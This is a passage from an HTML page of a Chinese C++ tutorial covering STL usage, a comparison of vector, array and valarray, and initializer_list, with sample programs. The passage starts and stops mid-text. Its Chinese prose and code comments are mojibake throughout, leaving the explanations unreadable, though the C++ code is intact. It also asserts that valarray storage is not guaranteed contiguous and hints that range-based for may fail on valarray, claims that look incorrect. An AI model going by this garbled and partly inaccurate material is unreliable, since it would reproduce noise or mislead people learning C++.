ä¸ºå®ƒåªéœ€è¦é‡æ–°é“¾æ¥èŠ‚ç‚¹ï¼Œè€Œä¸éœ€è¦ç§»åŠ¨å…ƒç´ ã€‚</li><li>  <code>list::remove()</code> å¯ä»¥çœŸæ­£åœ°ä»é“¾è¡¨ä¸­åˆ é™¤èŠ‚ç‚¹å¹¶è°ƒæ•´å¤§å°ï¼Œè€Œ <code>std::remove</code> ä¸èƒ½ã€‚</li><li>  å…³è”å®¹å™¨çš„ <code>find()</code> æˆå‘˜å‡½æ•°åˆ©ç”¨å…¶å†…éƒ¨æ ‘æˆ–å“ˆå¸Œç»“æ„ï¼Œå¤æ‚åº¦ä¸º O(log N) æˆ– O(1)ï¼Œè€Œ <code>std::find</code> æ˜¯çº¿æ€§æ‰«æ O(N)ã€‚</li></ul></li><li><strong>ä½¿ç”¨ STL ç®—æ³•:</strong><ul><li>  å½“å®¹å™¨æ²¡æœ‰æä¾›ç›¸åº”çš„æˆå‘˜å‡½æ•°æ—¶ã€‚</li><li>  å½“éœ€è¦è·¨ä¸åŒå®¹å™¨ç±»å‹ä½¿ç”¨ç»Ÿä¸€çš„ç®—æ³•æ—¶ã€‚</li><li>  å½“éœ€è¦æ›´å¤æ‚çš„ã€æˆå‘˜å‡½æ•°ä¸æ”¯æŒçš„æ“ä½œé€»è¾‘æ—¶ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ <code>std::remove_copy_if</code> å°†ä¸æ»¡è¶³æ¡ä»¶çš„å…ƒç´ å¤åˆ¶åˆ°å¦ä¸€ä¸ªå®¹å™¨ï¼‰ã€‚</li></ul></li></ul><h3 id="16-6-5-ä½¿ç”¨-STL"><a href="#16-6-5-ä½¿ç”¨-STL" class="headerlink" title="16.6.5 ä½¿ç”¨ STL"></a>16.6.5 ä½¿ç”¨ STL</h3><p>æŒæ¡ STL çš„å…³é”®åœ¨äºç†è§£å…¶ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶å¦‚ä½•ååŒå·¥ä½œï¼š</p><ol><li> <strong>é€‰æ‹©åˆé€‚çš„å®¹å™¨:</strong> æ ¹æ®æ•°æ®å­˜å‚¨å’Œè®¿é—®çš„éœ€æ±‚é€‰æ‹© <code>vector</code>, <code>list</code>, <code>map</code>, <code>set</code> ç­‰ã€‚</li><li> <strong>ä½¿ç”¨è¿­ä»£å™¨æŒ‡å®šèŒƒå›´:</strong> é€šè¿‡ <code>begin()</code>, <code>end()</code> æˆ–å…¶ä»–æ–¹å¼è·å–è¿­ä»£å™¨æ¥å®šä¹‰ç®—æ³•æ“ä½œçš„å…ƒç´ åŒºé—´ <code>[first, last)</code>ã€‚</li><li> <strong>é€‰æ‹©åˆé€‚çš„ç®—æ³•:</strong> ä» <code>&lt;algorithm&gt;</code> æˆ– <code>&lt;numeric&gt;</code> ä¸­é€‰æ‹©èƒ½å®Œæˆæ‰€éœ€ä»»åŠ¡çš„ç®—æ³•ã€‚</li><li> <strong>æä¾›è‡ªå®šä¹‰é€»è¾‘ (å¦‚æœéœ€è¦):</strong> é€šè¿‡å‡½æ•°å¯¹è±¡ã€lambda è¡¨è¾¾å¼æˆ–å‡½æ•°æŒ‡é’ˆå‘ç®—æ³•ä¼ é€’è‡ªå®šä¹‰çš„æ¯”è¾ƒã€åˆ¤æ–­æˆ–æ“ä½œè§„åˆ™ã€‚</li></ol><p>STL æ˜¯ä¸€ä¸ªå¼ºå¤§è€Œçµæ´»çš„åº“ï¼Œç†Ÿç»ƒä½¿ç”¨å®ƒå¯ä»¥å¤§å¤§æé«˜ C++ ç¼–ç¨‹çš„æ•ˆç‡å’Œä»£ç è´¨é‡ã€‚å»ºè®®å¤šæŸ¥é˜…æ–‡æ¡£ï¼ˆå¦‚ cppreference.comï¼‰äº†è§£å„ç§å®¹å™¨ã€ç®—æ³•å’Œè¿­ä»£å™¨çš„è¯¦ç»†ç”¨æ³•å’Œè¦æ±‚ã€‚</p><h2 id="16-7-å…¶ä»–åº“"><a href="#16-7-å…¶ä»–åº“" class="headerlink" title="16.7 å…¶ä»–åº“"></a>16.7 å…¶ä»–åº“</h2><p>é™¤äº† <code>string</code> ç±»ã€æ™ºèƒ½æŒ‡é’ˆå’Œ STL çš„æ ¸å¿ƒç»„ä»¶ï¼ˆå®¹å™¨ã€ç®—æ³•ã€è¿­ä»£å™¨ï¼‰ä¹‹å¤–ï¼ŒC++ æ ‡å‡†åº“è¿˜æä¾›äº†è®¸å¤šå…¶ä»–æœ‰ç”¨çš„å·¥å…·å’Œç±»ã€‚æœ¬èŠ‚å°†ç®€è¦ä»‹ç» <code>valarray</code> ç±»å’Œ C++11 å¼•å…¥çš„ <code>initializer_list</code>ã€‚</p><h3 id="16-7-1-vectorã€valarray-å’Œ-array"><a href="#16-7-1-vectorã€valarray-å’Œ-array" class="headerlink" title="16.7.1 vectorã€valarray å’Œ array"></a>16.7.1 vectorã€valarray å’Œ array</h3><p>æˆ‘ä»¬åœ¨å‰é¢ç« èŠ‚å·²ç»æ¥è§¦è¿‡ <code>vector</code> å’Œ <code>array</code>ï¼Œå®ƒä»¬éƒ½æä¾›äº†ç±»ä¼¼æ•°ç»„çš„åŠŸèƒ½ï¼Œä½†å„æœ‰ç‰¹ç‚¹ã€‚æ ‡å‡†åº“è¿˜åœ¨ <code>&lt;valarray&gt;</code> å¤´æ–‡ä»¶ä¸­æä¾›äº†å¦ä¸€ä¸ªæ¨¡æ¿ç±» <code>std::valarray</code>ï¼Œå®ƒä¸»è¦è®¾è®¡ç”¨äº<strong>æ•°å€¼è®¡ç®—</strong>ï¼Œç‰¹åˆ«æ˜¯å¯¹æ•´ä¸ªæ•°ç»„è¿›è¡Œé«˜æ•ˆçš„å…ƒç´ çº§ç®—æœ¯è¿ç®—ã€‚</p><ul><li><p><strong><code>std::vector&lt;T&gt;</code>:</strong></p><ul><li>  <strong>å¤´æ–‡ä»¶:</strong> <code>&lt;vector&gt;</code></li><li>  <strong>å¤§å°:</strong> åŠ¨æ€å¤§å°ï¼Œå¯è¿è¡Œæ—¶å¢é•¿å’Œæ”¶ç¼©ã€‚</li><li>  <strong>å†…å­˜:</strong> ä¿è¯å…ƒç´ è¿ç»­å­˜å‚¨ã€‚</li><li>  <strong>ä¸»è¦ç‰¹ç‚¹:</strong> é€šç”¨çš„åŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒä¸°å¯Œçš„ STL ç®—æ³•ï¼Œå°¾éƒ¨æ’å…¥/åˆ é™¤é«˜æ•ˆã€‚</li><li>  <strong>æ•°å€¼è¿ç®—:</strong> ä¸ç›´æ¥æ”¯æŒå…ƒç´ çº§çš„ç®—æœ¯è¿ç®—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œä¸¤ä¸ª <code>vector</code> ä¸èƒ½ç›´æ¥ç›¸åŠ ï¼‰ã€‚éœ€è¦æ‰‹åŠ¨å¾ªç¯æˆ–ä½¿ç”¨ <code>std::transform</code> ç­‰ç®—æ³•ã€‚</li></ul></li><li><p><strong><code>std::array&lt;T, N&gt;</code> (C++11):</strong></p><ul><li>  <strong>å¤´æ–‡ä»¶:</strong> <code>&lt;array&gt;</code></li><li>  <strong>å¤§å°:</strong> <strong>å›ºå®šå¤§å°</strong> <code>N</code>ï¼Œåœ¨ç¼–è¯‘æ—¶ç¡®å®šã€‚</li><li>  <strong>å†…å­˜:</strong> ä¿è¯å…ƒç´ è¿ç»­å­˜å‚¨ï¼Œé€šå¸¸åœ¨æ ˆä¸Šåˆ†é…ï¼ˆå¦‚æœæ˜¯å±€éƒ¨å˜é‡ä¸”å¤§å°é€‚ä¸­ï¼‰ã€‚</li><li>  <strong>ä¸»è¦ç‰¹ç‚¹:</strong> å¯¹ C é£æ ¼æ•°ç»„çš„ç±»å‹å®‰å…¨å°è£…ï¼Œæ”¯æŒ STL ç®—æ³•ï¼Œæ€§èƒ½ä¸ C é£æ ¼æ•°ç»„ç›¸å½“ã€‚</li><li>  <strong>æ•°å€¼è¿ç®—:</strong> ä¸ <code>vector</code> ç±»ä¼¼ï¼Œä¸ç›´æ¥æ”¯æŒå…ƒç´ çº§è¿ç®—ã€‚</li></ul></li><li><p><strong><code>std::valarray&lt;T&gt;</code>:</strong></p><ul><li>  <strong>å¤´æ–‡ä»¶:</strong> <code>&lt;valarray&gt;</code></li><li>  <strong>å¤§å°:</strong> åŠ¨æ€å¤§å°ï¼ˆä½†é€šå¸¸åœ¨åˆ›å»ºåå¤§å°å˜åŒ–ä¸é¢‘ç¹ï¼‰ã€‚</li><li>  <strong>å†…å­˜:</strong> ä¸ä¿è¯è¿ç»­å­˜å‚¨ï¼ˆå®ç°å¯èƒ½è¿›è¡Œä¼˜åŒ–ï¼Œå¦‚åˆ†å—ï¼‰ã€‚</li><li>  <strong>ä¸»è¦ç‰¹ç‚¹:</strong> <strong>ä¸“ä¸ºæ•°å€¼è®¡ç®—è®¾è®¡</strong>ã€‚é‡è½½äº†ç®—æœ¯è¿ç®—ç¬¦ (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code> ç­‰ï¼‰ä»¥æ”¯æŒ<strong>å…ƒç´ çº§ (element-wise)</strong> æ“ä½œã€‚è¿˜æä¾›äº†è®¸å¤šæ•°å­¦å‡½æ•°ï¼ˆå¦‚ <code>abs</code>, <code>sqrt</code>, <code>sin</code>, <code>cos</code> ç­‰ï¼‰çš„åº”ç”¨ç‰ˆæœ¬ã€‚</li><li>  <strong>STL å…¼å®¹æ€§:</strong> ä¸æ ‡å‡† STL ç®—æ³•çš„å…¼å®¹æ€§ä¸å¦‚ <code>vector</code> å’Œ <code>array</code> å¥½ï¼ˆä¾‹å¦‚ï¼Œå…¶è¿­ä»£å™¨å¯èƒ½ä¸æ˜¯æ ‡å‡†ç±»åˆ«ï¼‰ã€‚</li></ul></li></ul><p><strong>æ¯”è¾ƒæ€»ç»“:</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left"><code>std::vector&lt;T&gt;</code></th><th align="left"><code>std::array&lt;T, N&gt;</code> (C++11)</th><th align="left"><code>std::valarray&lt;T&gt;</code></th></tr></thead><tbody><tr><td align="left"><strong>å¤´æ–‡ä»¶</strong></td><td align="left"><code>&lt;vector&gt;</code></td><td align="left"><code>&lt;array&gt;</code></td><td align="left"><code>&lt;valarray&gt;</code></td></tr><tr><td align="left"><strong>å¤§å°</strong></td><td align="left">åŠ¨æ€</td><td align="left">å›ºå®š (ç¼–è¯‘æ—¶)</td><td align="left">åŠ¨æ€</td></tr><tr><td align="left"><strong>å†…å­˜</strong></td><td align="left">è¿ç»­</td><td align="left">è¿ç»­</td><td align="left">ä¸ä¿è¯è¿ç»­</td></tr><tr><td align="left"><strong>ä¸»è¦ç”¨é€”</strong></td><td align="left">é€šç”¨åŠ¨æ€æ•°ç»„</td><td align="left">C æ•°ç»„çš„å®‰å…¨æ›¿ä»£å“</td><td align="left">æ•°å€¼è®¡ç®—</td></tr><tr><td align="left"><strong>å…ƒç´ çº§è¿ç®—</strong></td><td align="left">å¦</td><td align="left">å¦</td><td align="left"><strong>æ˜¯</strong></td></tr><tr><td align="left"><strong>STL ç®—æ³•</strong></td><td align="left">å®Œå…¨å…¼å®¹</td><td align="left">å®Œå…¨å…¼å®¹</td><td align="left">æœ‰é™å…¼å®¹</td></tr></tbody></table><p><strong><code>valarray</code> ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // for iota</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ valarray è¿›è¡Œå…ƒç´ çº§è¿ç®—</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v1 = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v2 = &#123;<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v_sum, v_prod;</span><br><span class="line"></span><br><span class="line">    v_sum = v1 + v2;   <span class="comment">// å…ƒç´ çº§ç›¸åŠ : &#123;1.5, 2.5, 3.5, 4.5&#125;</span></span><br><span class="line">    v_prod = v1 * <span class="number">2.0</span>; <span class="comment">// æ¯ä¸ªå…ƒç´ ä¹˜ä»¥ 2.0: &#123;2.0, 4.0, 6.0, 8.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;v1 + v2 = &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : v_sum) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// C++11 range-based for å¯èƒ½ä¸ç›´æ¥æ”¯æŒ valarray</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ä¼ ç»Ÿå¾ªç¯æˆ–ä¸‹æ ‡è®¿é—®</span></span><br><span class="line">    <span class="comment">// for (size_t i = 0; i &lt; v_sum.size(); ++i) std::cout &lt;&lt; v_sum[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;v1 * 2.0 = &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; v_prod.size(); ++i) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; v_prod[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åº”ç”¨æ•°å­¦å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v_sqrt = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(v_prod); <span class="comment">// å¯¹æ¯ä¸ªå…ƒç´ æ±‚å¹³æ–¹æ ¹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sqrt(v_prod) = &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; v_sqrt.size(); ++i) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; v_sqrt[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹æ¯” vector (éœ€è¦ç®—æ³•)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; vec1 = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">vec_prod</span><span class="params">(vec1.size())</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::transform(vec1.begin(), vec1.end(), vec_prod.begin(),</span><br><span class="line">                   [](<span class="keyword">double</span> x)&#123; <span class="keyword">return</span> x * <span class="number">2.0</span>; &#125;);</span><br><span class="line">    <span class="comment">// vec_prod ç°åœ¨æ˜¯ &#123;2.0, 4.0, 6.0, 8.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ çš„ä¸»è¦ä»»åŠ¡æ˜¯è¿›è¡Œå‘é‡åŒ–æˆ–çŸ©é˜µå¼çš„æ•°å€¼è®¡ç®—ï¼Œ<code>valarray</code> å¯èƒ½æ˜¯ä¸€ä¸ªå€¼å¾—è€ƒè™‘çš„é€‰æ‹©ï¼Œå°½ç®¡åœ¨ç°ä»£ C++ ä¸­ï¼Œä¹Ÿæœ‰è®¸å¤šç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Eigen, Blazeï¼‰æä¾›äº†æ›´å¼ºå¤§å’Œçµæ´»çš„çº¿æ€§ä»£æ•°åŠŸèƒ½ã€‚å¯¹äºé€šç”¨çš„åŠ¨æ€åºåˆ—å­˜å‚¨ï¼Œ<code>vector</code> ä»ç„¶æ˜¯é¦–é€‰ã€‚</p><h3 id="16-7-2-æ¨¡æ¿-initializer-listï¼ˆC-11ï¼‰"><a href="#16-7-2-æ¨¡æ¿-initializer-listï¼ˆC-11ï¼‰" class="headerlink" title="16.7.2 æ¨¡æ¿ initializer_listï¼ˆC++11ï¼‰"></a>16.7.2 æ¨¡æ¿ initializer_listï¼ˆC++11ï¼‰</h3><p>C++11 å¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ¨¡æ¿ç±» <code>std::initializer_list&lt;T&gt;</code>ï¼Œå®šä¹‰åœ¨ <code>&lt;initializer_list&gt;</code> å¤´æ–‡ä»¶ä¸­ã€‚å®ƒæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ä»£ç†å¯¹è±¡ï¼Œä»£è¡¨äº†ä¸€ä¸ªç”¨<strong>èŠ±æ‹¬å· <code>&#123;&#125;</code></strong> åˆå§‹åŒ–çš„å€¼åˆ—è¡¨ï¼Œå…¶ä¸­æ‰€æœ‰å€¼çš„ç±»å‹éƒ½æ˜¯ <code>T</code> æˆ–å¯ä»¥éšå¼è½¬æ¢ä¸º <code>T</code>ã€‚</p><p><strong>ä¸»è¦ç›®çš„:</strong> ä½¿å¾—å‡½æ•°ï¼ˆå°¤å…¶æ˜¯æ„é€ å‡½æ•°ï¼‰èƒ½å¤Ÿæ¥å—<strong>ä»»æ„æ•°é‡</strong>çš„ã€ç±»å‹ç›¸åŒçš„åˆå§‹åŒ–å€¼ï¼Œå°±åƒå†…ç½®æ•°ç»„æˆ–èšåˆç±»å‹é‚£æ ·ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ä¸€æ ·ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>è½»é‡çº§:</strong> <code>initializer_list</code> å¯¹è±¡æœ¬èº«é€šå¸¸åªåŒ…å«æŒ‡å‘åº•å±‚ï¼ˆä¸´æ—¶ï¼‰æ•°ç»„çš„æŒ‡é’ˆå’Œæ•°ç»„çš„å¤§å°ã€‚å¤åˆ¶ <code>initializer_list</code> å¯¹è±¡æ˜¯æµ…æ‹·è´ï¼Œå¼€é”€å¾ˆå°ã€‚</li><li>  <strong>åªè¯»è®¿é—®:</strong> é€šè¿‡ <code>initializer_list</code> è®¿é—®å…¶å…ƒç´ é€šå¸¸æ˜¯åªè¯»çš„ (<code>const T&amp;</code>)ã€‚ä½ ä¸èƒ½é€šè¿‡ <code>initializer_list</code> ä¿®æ”¹åˆ—è¡¨ä¸­çš„å…ƒç´ ã€‚</li><li>  <strong>ç”Ÿå‘½å‘¨æœŸ:</strong> <code>initializer_list</code> å¼•ç”¨çš„åº•å±‚æ•°ç»„çš„ç”Ÿå‘½å‘¨æœŸä¸ <code>initializer_list</code> å¯¹è±¡æœ¬èº«ç›¸å…³è”ï¼Œé€šå¸¸æ˜¯ä¸´æ—¶çš„ã€‚ä¸è¦å­˜å‚¨ <code>initializer_list</code> å¯¹è±¡å¹¶åœ¨å…¶åŸå§‹ä¸Šä¸‹æ–‡ä¹‹å¤–ä½¿ç”¨ã€‚</li><li>  <strong>è¿­ä»£å™¨:</strong> æä¾›äº† <code>begin()</code> å’Œ <code>end()</code> æˆå‘˜å‡½æ•°ï¼Œè¿”å›æŒ‡å‘åº•å±‚æ•°ç»„çš„ <code>const T*</code> æŒ‡é’ˆï¼Œå¯ä»¥æ–¹ä¾¿åœ°éå†åˆ—è¡¨ä¸­çš„å…ƒç´ ã€‚</li><li>  <strong><code>size()</code>:</strong> è¿”å›åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡ã€‚</li></ul><p><strong>å¦‚ä½•å·¥ä½œ:</strong> å½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªéœ€è¦ <code>std::initializer_list&lt;T&gt;</code> å‚æ•°çš„åœ°æ–¹ï¼Œå¹¶ä¸”ä½ æä¾›äº†ä¸€ä¸ª <code>&#123;value1, value2, ...&#125;</code> å½¢å¼çš„åˆå§‹åŒ–åˆ—è¡¨æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ï¼š</p><ol><li> åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ã€ç±»å‹ä¸º <code>const T</code> çš„æ•°ç»„ï¼Œå¹¶å°†åˆ—è¡¨ä¸­çš„å€¼å­˜å‚¨è¿›å»ã€‚</li><li> åˆ›å»ºä¸€ä¸ª <code>std::initializer_list&lt;T&gt;</code> å¯¹è±¡ï¼Œä½¿å…¶å†…éƒ¨æŒ‡é’ˆæŒ‡å‘è¿™ä¸ªä¸´æ—¶æ•°ç»„çš„å¼€å¤´ï¼Œå¹¶è®°å½•æ•°ç»„çš„å¤§å°ã€‚</li><li> å°†è¿™ä¸ª <code>initializer_list&lt;T&gt;</code> å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æˆ–æ„é€ å‡½æ•°ã€‚</li></ol><h3 id="16-7-3-ä½¿ç”¨-initializer-list"><a href="#16-7-3-ä½¿ç”¨-initializer-list" class="headerlink" title="16.7.3 ä½¿ç”¨ initializer_list"></a>16.7.3 ä½¿ç”¨ initializer_list</h3><p><code>initializer_list</code> æœ€å¸¸è§çš„ç”¨é€”æ˜¯ä½œä¸ºå‡½æ•°æˆ–æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚</p><p><strong>1. ä½œä¸ºå‡½æ•°å‚æ•°:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°æ¥å—ä¸€ä¸ª initializer_list&lt;int&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_ints</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;<span class="keyword">int</span>&gt; il)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing &quot;</span> &lt;&lt; il.size() &lt;&lt; <span class="string">&quot; integers: &quot;</span>;</span><br><span class="line">    <span class="comment">// å¯ä»¥ä½¿ç”¨èŒƒå›´ for å¾ªç¯éå†</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">int</span>&amp; val : il) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æˆ–è€…ä½¿ç”¨ begin()/end()</span></span><br><span class="line">    <span class="comment">// for (auto it = il.begin(); it != il.end(); ++it) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; *it &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨¡æ¿å‡½æ•°æ¥å—ä»»æ„ç±»å‹çš„ initializer_list</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">sum_list</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;T&gt; il)</span> </span>&#123;</span><br><span class="line">    T total&#123;&#125;; <span class="comment">// å€¼åˆå§‹åŒ– (å¯¹äºæ•°å€¼ç±»å‹ä¸º 0)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> T&amp; val : il) &#123;</span><br><span class="line">        total += val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    print_ints(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;); <span class="comment">// ç›´æ¥ä¼ é€’èŠ±æ‹¬å·åˆ—è¡¨</span></span><br><span class="line">    print_ints(&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;);</span><br><span class="line">    print_ints(&#123;&#125;); <span class="comment">// ä¼ é€’ç©ºåˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> total_int = sum_list(&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>&#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of ints: &quot;</span> &lt;&lt; total_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> total_double = sum_list(&#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>&#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of doubles: &quot;</span> &lt;&lt; total_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 6.6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::string total_string = sum_list&lt;std::string&gt;(&#123;&quot;Hello&quot;, &quot; &quot;, &quot;World&quot;&#125;); // ä¹Ÿå¯ä»¥ç”¨äºæ”¯æŒ += çš„ç±»å‹</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Sum of strings: &quot; &lt;&lt; total_string &lt;&lt; std::endl; // è¾“å‡º &quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. ä½œä¸ºæ„é€ å‡½æ•°å‚æ•°:</strong></p><p>è¿™æ˜¯ 